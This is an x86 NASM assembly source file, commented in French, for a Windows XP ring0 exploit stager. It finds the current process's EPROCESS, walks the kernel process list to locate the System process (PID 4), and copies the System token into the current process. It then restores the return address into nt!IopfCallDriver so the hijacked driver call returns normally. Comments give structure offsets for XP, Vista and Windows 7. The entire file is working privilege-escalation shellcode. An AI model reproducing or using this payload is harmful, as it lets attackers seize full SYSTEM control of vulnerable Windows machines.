;stager_ring0_xp.asm
;D:\Outils\nasm\nasm.exe -f bin stager_ring0_xp.asm -o stager.exe
;
;set current token to SYSTEM's token
;branch in ring3 @ 0x00000000
;ESP @ 0x00000100
BITS 32

_start:
	;On reforge le ebp de la fonction, histoire qu'elle puisse se finir sans probleme
	mov ebp, esp
	add bp, 0x14
	
	pushad

find_current_eprocess:
	mov bx, (0x120 + 4)              ;0x120 = KPCR.PrcbData :: 0x4 = KPRCB.CurrentThread
	mov eax, dword [fs : bx]              ;EAX = KPCR.PrcbData.CurrentThread

	; [*] Generate KTHREAD.ApcState offsets..
	; 'winxpsp123_x86' -> 0x034 | 'winvistartmsp1sp2_x86' -> 0x038 | 'win7rtm_x86' -> 0x040
	;  0x10 offset KAPC_STATE.Process - constant
	mov eax, dword [eax + 0x034 + 0x10]      ;EAX = KTHREAD.ApcState.Process
	
	; EBP = Sauvegarde de l'EPROCESS du debut du parcours
	mov ebp, eax
	
	; [*] Generate EPROCESS.ActiveProcessLinks offsets..
	; 'winxpsp123_x86' -> 0x088 | 'winvistartmsp12_x86' -> 0x0A0 | 'win7rtm_x86' -> 0x0B8
	xor ecx, ecx
	mov cl, 0x88 ;EDX = offset EPROCESS.ActiveProcessLinks :: On stocke l'offset ici, plus commode
	add ax, cx   ;EAX= CurrentEPROCESS.ActiveProcessLinks
	
walk_list_entry:
	mov edx, dword [eax] ;EDX = PLIST_ENTRY suivante
	mov eax, edx

	;Le champs d'avant ActiveProcessLinks = UniqueProcessId
	cmp dword [edx - 0x4], 0x4     ;Est-ce le PID de systeme ?
	je escaladate_privileges
	jmp walk_list_entry

escaladate_privileges:
	; EBP = notre EPROCESS
	; EDX = System EPROCESS
	sub dl, 0x88 ; On realigne pour avoir l'EPROCESS
	
	;[*] Generate EPROCESS.Token offsets..
	; 'winxpsp123_x86' -> 0x0C8 | 'winvistartmsp12_x86' -> 0x0E0 | 'win7rtm_x86' -> 0x0F8

	add dl, 0xC8
	mov esi, dword [edx] ; ESI = System token
	
	xor edx, edx
	mov dl, 0xC8
	mov dword [edx + ebp], esi

it_is_done_folks:
	
	popad
	
	push 0xdeadbeef
	push eax
	push ebx
	
	;On recupere la base du kernel
	xor  eax, eax
	mov  eax, [fs:eax + 0x34]
	mov  eax, [eax + 0x10]
	
	;On reforge le seip original
	;Notre fonction est appeler par nt!IopfCallDriver+0x31 = 804eddf9 = seip originel
	;kd> ? 804eddf9 - nt
	;Evaluate expression: 93689 = 00016df9
	xor ebx, ebx
	inc ebx
	shl ebx, 16 ;EBX = 0x10000
	
	add bx, 0x6DF9
	add eax, ebx ;EAX = seip originel
	
	pop ebx
	mov [esp + 4], eax
	pop eax
	ret	